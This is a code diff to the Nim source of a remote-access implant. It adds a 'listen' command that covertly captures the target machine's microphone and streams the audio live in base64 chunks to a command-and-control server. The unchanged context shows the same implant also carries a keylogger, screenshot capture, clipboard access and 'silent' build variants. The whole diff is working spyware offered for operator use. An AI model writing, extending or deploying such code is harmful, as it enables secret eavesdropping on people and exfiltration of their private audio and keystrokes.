@@ -103,6 +103,16 @@ const
   MIC_BITS         = 16
   MIC_BUF_COUNT    = 4   # poll-queue depth
   MIC_BUF_MS       = 250 # each buffer holds 250 ms of audio
+  # Live listen: how big the lock-guarded queue can grow before the
+  # capture thread drops new buffers (prevents unbounded RAM if the
+  # network is much slower than the mic). 4 * 250ms = 1s of buffered
+  # audio; after that, drop the oldest.
+  MIC_LISTEN_QUEUE_MAX = 4
+  # Sentinel total_chunks for the live stream — the server's
+  # handleFileChunk closes the file when `got >= total_chunks`, so we
+  # set this huge to keep the file open until the agent sends a
+  # final `last_chunk: true` on unlisten.
+  MIC_LISTEN_TOTAL_SENTINEL = 1_000_000
   # Survival flags. Default to FALSE for "silent" variant. Use
   # compile-time flags to enable for the engagement/aggressive
   # variants — see build.ps1.
@@ -1179,6 +1189,65 @@ proc keyloggerThread() {.thread.} =
 var keylogThreadVar: Thread[void]
 var keylogThreadId: int = 0
 
+# ------------------------------------------------------------
+# MIC LIVE LISTEN  (operator -> listen <id> -> "voice call" stream)
+# ------------------------------------------------------------
+# Three pieces:
+#   1. micListenCaptureThread — winmm polling on a dedicated thread,
+#      pushes completed PCM buffers to a Lock-guarded queue.
+#   2. micListenDrainTask     — async task (fire-and-forget) that
+#      pops the queue and emits `file_chunk` messages to the C2.
+#   3. The dispatcher's listen / unlisten branches set/clear the
+#      micListenRunning flag and orchestrate teardown.
+#
+# Why split capture from send: winmm's `waveInAddBuffer` and
+# `WHDR_DONE` polling are blocking and must run on a thread that
+# doesn't share the event loop. The async event loop is the only
+# thing that can `await sendToC2(...)`, so we hand buffers between
+# the two via the queue.
+var
+  micListenRunning = false
+  micListenLock: Lock
+  # Live listen uses a single fixed-size ring of raw byte chunks
+  # (allocated with `alloc`, no GC tracking). The capture thread
+  # writes here, the main async loop reads. This sidesteps Nim's
+  # GC-safety check on cross-thread seq[byte] access.
+  micListenRing: ptr UncheckedArray[byte] = nil
+  micListenRingCap: int = 0   # total bytes in the ring
+  micListenRingHead: int = 0  # write offset (thread)
+  micListenRingTail: int = 0  # read offset (main)
+  micListenRingCount: int = 0 # bytes pending
+  # Filename is a fixed-size byte array (not a GC string) so the
+  # async drain task can read it without a gcsafe violation.
+  micListenFilenameBuf: array[64, byte]
+  micListenFilenameLen: int = 0
+  micListenChunkIdx: int = 0
+  micListenBufSize: int = 0
+  micListenFormatKnown: bool = false
+  micListenFormat: WAVEFORMATEX
+  micListenHdr: array[MIC_BUF_COUNT, WAVEHDR]
+  micListenBufs: array[MIC_BUF_COUNT, ptr UncheckedArray[byte]]
+  micListenBufsLen: int = 0
+  micListenHwi: HWAVEIN = 0
+  micListenStalled: bool = false
+  micListenStartedAt: MonoTime
+var micListenThreadVar: Thread[void]
+
+proc getMicListenFilename(): string =
+  # View into the fixed-size byte array, returned as a regular string
+  # only for the duration of one expression (safe because nothing
+  # else writes to the buffer while a single message is being
+  # assembled by the drain task).
+  result = newString(micListenFilenameLen)
+  for i in 0..<micListenFilenameLen:
+    result[i] = char(micListenFilenameBuf[i])
+
+proc setMicListenFilename(s: string) =
+  let n = min(s.len, micListenFilenameBuf.len - 1)
+  for i in 0..<n: micListenFilenameBuf[i] = byte(s[i])
+  micListenFilenameBuf[n] = 0
+  micListenFilenameLen = n
+
 proc startKeylogger() =
   if keyloggerRunning: return
   keyloggerRunning = true
@@ -1306,6 +1375,38 @@ proc takeScreenshot(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
   except:
     return %* {"type": "output", "data": "[!] screenshot: " & getCurrentExceptionMsg()}
 
+proc buildMicWavHeader(sampleRate, channels, bitsPerSample, pcmLen: int): seq[byte] =
+  # 44-byte RIFF/fmt/data header. Shared by captureMic (one-shot)
+  # and the live listen header chunk. Bytes are deterministic for
+  # any given format, so we can pre-compute and append PCM as it
+  # arrives.
+  let bytesPerSample = channels * (bitsPerSample div 8)
+  let bytesPerSec = sampleRate * bytesPerSample
+  proc putU32le(b: var seq[byte], v: int) =
+    b.add(byte(v and 0xFF))
+    b.add(byte((v shr 8) and 0xFF))
+    b.add(byte((v shr 16) and 0xFF))
+    b.add(byte((v shr 24) and 0xFF))
+  proc putU16le(b: var seq[byte], v: int) =
+    b.add(byte(v and 0xFF))
+    b.add(byte((v shr 8) and 0xFF))
+  proc putTag(b: var seq[byte], tag: string) =
+    for ch in tag: b.add(byte(ch))
+  result = newSeqOfCap[byte](44)
+  putTag(result, "RIFF")
+  putU32le(result, 36 + pcmLen)
+  putTag(result, "WAVE")
+  putTag(result, "fmt ")
+  putU32le(result, 16)
+  putU16le(result, 1)               # PCM
+  putU16le(result, channels)
+  putU32le(result, sampleRate)
+  putU32le(result, bytesPerSec)
+  putU16le(result, bytesPerSample)
+  putU16le(result, bitsPerSample)
+  putTag(result, "data")
+  putU32le(result, pcmLen)
+
 proc captureMic(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.},
                 seconds: int): Future[JsonNode] {.async.} =
   # Capture N seconds of audio from the default input device (WAVE_MAPPER),
@@ -1432,35 +1533,8 @@ proc captureMic(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.},
   if pcmFilled < pcm.len:
     pcm.setLen(pcmFilled)
 
-  # WAV header builder (RIFF / WAVE / fmt / data). All multi-byte
-  # fields little-endian. 44-byte header.
-  proc putU32le(b: var seq[byte], v: int) =
-    b.add(byte(v and 0xFF))
-    b.add(byte((v shr 8) and 0xFF))
-    b.add(byte((v shr 16) and 0xFF))
-    b.add(byte((v shr 24) and 0xFF))
-  proc putU16le(b: var seq[byte], v: int) =
-    b.add(byte(v and 0xFF))
-    b.add(byte((v shr 8) and 0xFF))
-  proc putTag(b: var seq[byte], tag: string) =
-    # RIFF chunk tags are 4 ASCII bytes; append one at a time so the
-    # seq[byte] `add` overload picks `byte` not `string`.
-    for ch in tag: b.add(byte(ch))
-
-  var wav = newSeqOfCap[byte](44 + pcm.len)
-  putTag(wav, "RIFF")
-  putU32le(wav, 36 + pcm.len)  # file size minus 8
-  putTag(wav, "WAVE")
-  putTag(wav, "fmt ")
-  putU32le(wav, 16)            # fmt chunk size
-  putU16le(wav, 1)             # PCM
-  putU16le(wav, channels)
-  putU32le(wav, sampleRate)
-  putU32le(wav, bytesPerSec)
-  putU16le(wav, bytesPerSample)
-  putU16le(wav, bitsPerSample)
-  putTag(wav, "data")
-  putU32le(wav, pcm.len)
+  # WAV header (44 bytes) + PCM payload.
+  var wav = buildMicWavHeader(sampleRate, channels, bitsPerSample, pcm.len)
   for sampleByte in pcm: wav.add(sampleByte)
 
   let ts = getTime().toUnix
@@ -1487,6 +1561,152 @@ proc captureMic(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.},
                      $sampleRate & "Hz " & $channels & "ch " &
                      $bitsPerSample & "bit (" & $wav.len & " bytes, " &
                      $totalChunks & " chunks) -> downloads/" & filename}
+
+# ------------------------------------------------------------
+# MIC LIVE LISTEN — capture thread + async drain
+# ------------------------------------------------------------
+proc micListenCaptureThread() {.thread.} =
+  # winmm polling loop. Copies captured PCM into micListenRing
+  # (raw memory, no GC). Exits when micListenRunning flips to
+  # false; the dispatcher joins this thread on unlisten.
+  if not micListenFormatKnown:
+    micListenStalled = true
+    return
+  let sampleRate    = int(micListenFormat.nSamplesPerSec)
+  let channels      = int(micListenFormat.nChannels)
+  let bitsPerSample = int(micListenFormat.wBitsPerSample)
+  let bytesPerSample = channels * (bitsPerSample div 8)
+  let bufSamples = (sampleRate * MIC_BUF_MS) div 1000
+  let bufSize = bufSamples * bytesPerSample
+  micListenBufSize = bufSize
+
+  var hwi: HWAVEIN = 0
+  let rc = waveInOpen(addr hwi, WAVE_MAPPER, addr micListenFormat, 0, 0, CALLBACK_NULL)
+  if rc != MMSYSERR_NOERROR or hwi == 0:
+    micListenStalled = true
+    return
+  micListenHwi = hwi
+
+  for i in 0..<MIC_BUF_COUNT:
+    if micListenBufs[i] == nil:
+      micListenBufs[i] = cast[ptr UncheckedArray[byte]](alloc(bufSize))
+    zeroMem(micListenBufs[i], bufSize)
+    zeroMem(addr micListenHdr[i], sizeof(WAVEHDR))
+    micListenHdr[i].lpData = cast[LPSTR](micListenBufs[i])
+    micListenHdr[i].dwBufferLength = DWORD(bufSize)
+    micListenHdr[i].dwBytesRecorded = 0
+    micListenHdr[i].dwFlags = 0
+    let rcp = waveInPrepareHeader(hwi, addr micListenHdr[i], DWORD(sizeof(WAVEHDR)))
+    if rcp != MMSYSERR_NOERROR:
+      micListenStalled = true
+      discard waveInClose(hwi)
+      micListenHwi = 0
+      return
+    let rca = waveInAddBuffer(hwi, addr micListenHdr[i], DWORD(sizeof(WAVEHDR)))
+    if rca != MMSYSERR_NOERROR:
+      micListenStalled = true
+      discard waveInUnprepareHeader(hwi, addr micListenHdr[i], DWORD(sizeof(WAVEHDR)))
+      discard waveInClose(hwi)
+      micListenHwi = 0
+      return
+
+  let rs = waveInStart(hwi)
+  if rs != MMSYSERR_NOERROR:
+    for i in 0..<MIC_BUF_COUNT:
+      discard waveInUnprepareHeader(hwi, addr micListenHdr[i], DWORD(sizeof(WAVEHDR)))
+    discard waveInClose(hwi)
+    micListenHwi = 0
+    micListenStalled = true
+    return
+
+  while micListenRunning:
+    var any = false
+    for i in 0..<MIC_BUF_COUNT:
+      if (micListenHdr[i].dwFlags and WHDR_DONE) != 0:
+        any = true
+        let captured = int(micListenHdr[i].dwBytesRecorded)
+        if captured > 0 and micListenRing != nil:
+          # Copy the captured PCM into the ring buffer. If the
+          # ring is full, advance tail (drop oldest). Lock holds
+          # while we copy, so the drain task sees a consistent
+          # snapshot.
+          acquire(micListenLock)
+          if micListenRingCount + captured > micListenRingCap:
+            # Drop enough from the tail to make room.
+            let drop = min(micListenRingCount, (micListenRingCount + captured) - micListenRingCap)
+            micListenRingTail = (micListenRingTail + drop) mod micListenRingCap
+            dec micListenRingCount, drop
+          let first = min(captured, micListenRingCap - micListenRingHead)
+          copyMem(addr micListenRing[micListenRingHead], micListenBufs[i], first)
+          if first < captured:
+            copyMem(addr micListenRing[0], addr micListenBufs[i][first], captured - first)
+          micListenRingHead = (micListenRingHead + captured) mod micListenRingCap
+          inc micListenRingCount, captured
+          release(micListenLock)
+        # Re-queue the buffer.
+        zeroMem(addr micListenHdr[i], sizeof(WAVEHDR))
+        micListenHdr[i].lpData = cast[LPSTR](micListenBufs[i])
+        micListenHdr[i].dwBufferLength = DWORD(bufSize)
+        let rca = waveInAddBuffer(hwi, addr micListenHdr[i], DWORD(sizeof(WAVEHDR)))
+        if rca != MMSYSERR_NOERROR:
+          micListenStalled = true
+    if not any:
+      sleep(15)
+    else:
+      sleep(5)
+
+  # Teardown.
+  discard waveInStop(hwi)
+  discard waveInReset(hwi)
+  for i in 0..<MIC_BUF_COUNT:
+    discard waveInUnprepareHeader(hwi, addr micListenHdr[i], DWORD(sizeof(WAVEHDR)))
+  discard waveInClose(hwi)
+  micListenHwi = 0
+
+proc micListenDrainTask(sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
+                        ) {.async, gcsafe.} =
+  # Long-running drain. Reads from micListenRing (raw memory) and
+  # emits `file_chunk` messages. Exits when micListenRunning flips
+  # to false AND the ring is empty.
+  while micListenRunning or micListenRingCount > 0:
+    # Pull one buffer's worth (or whatever's available) out of the ring.
+    var frameLen = 0
+    acquire(micListenLock)
+    if micListenRingCount > 0 and micListenRing != nil:
+      frameLen = min(micListenBufSize, micListenRingCount)
+      inc micListenChunkIdx
+    release(micListenLock)
+
+    if frameLen > 0:
+      # Copy out of the ring (under lock) into a local seq[byte]
+      # so we can encode/send without holding the lock.
+      var chunk = newSeq[byte](frameLen)
+      acquire(micListenLock)
+      let first = min(frameLen, micListenRingCap - micListenRingTail)
+      copyMem(addr chunk[0], addr micListenRing[micListenRingTail], first)
+      if first < frameLen:
+        copyMem(addr chunk[first], addr micListenRing[0], frameLen - first)
+      micListenRingTail = (micListenRingTail + frameLen) mod micListenRingCap
+      dec micListenRingCount, frameLen
+      release(micListenLock)
+
+      try:
+        let fname = getMicListenFilename()
+        await sendToC2(%* {
+          "type": "file_chunk",
+          "filepath": fname,
+          "chunk_index": micListenChunkIdx,
+          "total_chunks": MIC_LISTEN_TOTAL_SENTINEL,
+          "data": base64.encode(chunk),
+          "last_chunk": false
+        })
+      except:
+        micListenRunning = false
+        micListenStalled = true
+        return
+    else:
+      if micListenRunning:
+        await sleepAsync(20)
 
 proc processList(): JsonNode =
   try:
@@ -1650,6 +1870,103 @@ proc handleCommand(sc: SessionCrypto, cmd: JsonNode,
       except:
         secs = MIC_DEFAULT_SECS
     await sendToC2(await captureMic(sendToC2, secs))
+  of "listen":
+    # Live mic stream — each ~250ms buffer ships out as it fills, so
+    # the operator hears the agent's environment in near-realtime
+    # (open downloads/<id>/mic_live_<ts>.wav in `ffplay -infbuf -f
+    # s16le -ar 16000 -ac 1 ...` or VLC with file-change auto-reload).
+    if micListenRunning:
+      let curName = getMicListenFilename()
+      await sendToC2(%* {"type": "output",
+                        "data": "[!] already listening -> " & curName})
+      return
+    # Pre-fill the WAV format the capture thread will use.
+    micListenFormat.wFormatTag       = WAVE_FORMAT_PCM
+    micListenFormat.nChannels        = WORD(MIC_CHANNELS)
+    micListenFormat.nSamplesPerSec   = DWORD(MIC_SAMPLE_RATE)
+    micListenFormat.nAvgBytesPerSec  = DWORD(MIC_SAMPLE_RATE * MIC_CHANNELS * (MIC_BITS div 8))
+    micListenFormat.nBlockAlign      = WORD(MIC_CHANNELS * (MIC_BITS div 8))
+    micListenFormat.wBitsPerSample   = WORD(MIC_BITS)
+    micListenFormat.cbSize           = 0
+    micListenFormatKnown = true
+    # Allocate per-buffer raw memory (8 KB each, ×4 = 32 KB total)
+    # and a 256 KB ring for handoff. All raw — no GC tracking, so
+    # the capture thread can read/write them without GC-safety issues.
+    let bufBytes = (MIC_SAMPLE_RATE * MIC_BUF_MS div 1000) * (MIC_CHANNELS * MIC_BITS div 8)
+    micListenBufsLen = bufBytes
+    for i in 0..<MIC_BUF_COUNT:
+      if micListenBufs[i] == nil:
+        micListenBufs[i] = cast[ptr UncheckedArray[byte]](alloc(bufBytes))
+    micListenRingCap = bufBytes * MIC_LISTEN_QUEUE_MAX * 2
+    if micListenRing != nil: dealloc(micListenRing)
+    micListenRing = cast[ptr UncheckedArray[byte]](alloc(micListenRingCap))
+    micListenRingHead = 0
+    micListenRingTail = 0
+    micListenRingCount = 0
+    initLock(micListenLock)  # idempotent
+    setMicListenFilename("mic_live_" & $getTime().toUnix & ".wav")
+    let fname = getMicListenFilename()
+    micListenChunkIdx = 0
+    micListenStalled = false
+    micListenStartedAt = getMonoTime()
+    # Send the 44-byte WAV header as chunk 0 so the server starts
+    # writing the file immediately and the operator's player has
+    # a valid file from t=0.
+    let hdr = buildMicWavHeader(MIC_SAMPLE_RATE, MIC_CHANNELS, MIC_BITS, 0)
+    inc micListenChunkIdx
+    await sendToC2(%* {
+      "type": "file_chunk",
+      "filepath": fname,
+      "chunk_index": micListenChunkIdx,
+      "total_chunks": MIC_LISTEN_TOTAL_SENTINEL,
+      "data": base64.encode(hdr),
+      "last_chunk": false
+    })
+    # Spawn the capture thread and the async drain task.
+    micListenRunning = true
+    createThread(micListenThreadVar, micListenCaptureThread)
+    asyncCheck micListenDrainTask(sendToC2)
+    await sendToC2(%* {"type": "output",
+                      "data": "[" & BuildPrefix & "] listening -> downloads/" &
+                              fname & " (open in ffplay/vlc to hear live)"})
+  of "unlisten":
+    if not micListenRunning:
+      await sendToC2(%* {"type": "output", "data": "[!] not listening"})
+      return
+    micListenRunning = false
+    # Capture thread checks the flag and exits its loop; the drain
+    # task continues until the ring is empty. Join so we know the
+    # thread has finished its teardown (waveInStop/Close).
+    joinThread(micListenThreadVar)
+    # Give the drain task a moment to finish the last batch
+    # (it's `asyncCheck`'d, so we await it implicitly by waiting
+    # on the ring count to reach zero, with a short timeout).
+    var waitedMs = 0
+    while micListenRingCount > 0 and waitedMs < 2000:
+      await sleepAsync(20)
+      waitedMs += 20
+    # Final closing chunk — server flushes and closes the file.
+    inc micListenChunkIdx
+    let finalFname = getMicListenFilename()
+    await sendToC2(%* {
+      "type": "file_chunk",
+      "filepath": finalFname,
+      "chunk_index": micListenChunkIdx,
+      "total_chunks": micListenChunkIdx,
+      "data": "",
+      "last_chunk": true
+    })
+    let secs = (getMonoTime() - micListenStartedAt).inMilliseconds div 1000
+    let stalledNote = if micListenStalled: " (capture stalled)" else: ""
+    await sendToC2(%* {"type": "output",
+                      "data": "[" & BuildPrefix & "] listen stopped after " &
+                              $secs & "s" & stalledNote & " -> downloads/" & finalFname})
+    # Free the ring; per-buffer memory stays allocated for next session.
+    if micListenRing != nil:
+      dealloc(micListenRing)
+      micListenRing = nil
+    micListenFormatKnown = false
+    micListenFilenameLen = 0
   of "ps":
     await sendToC2(processList())
   of "clip":
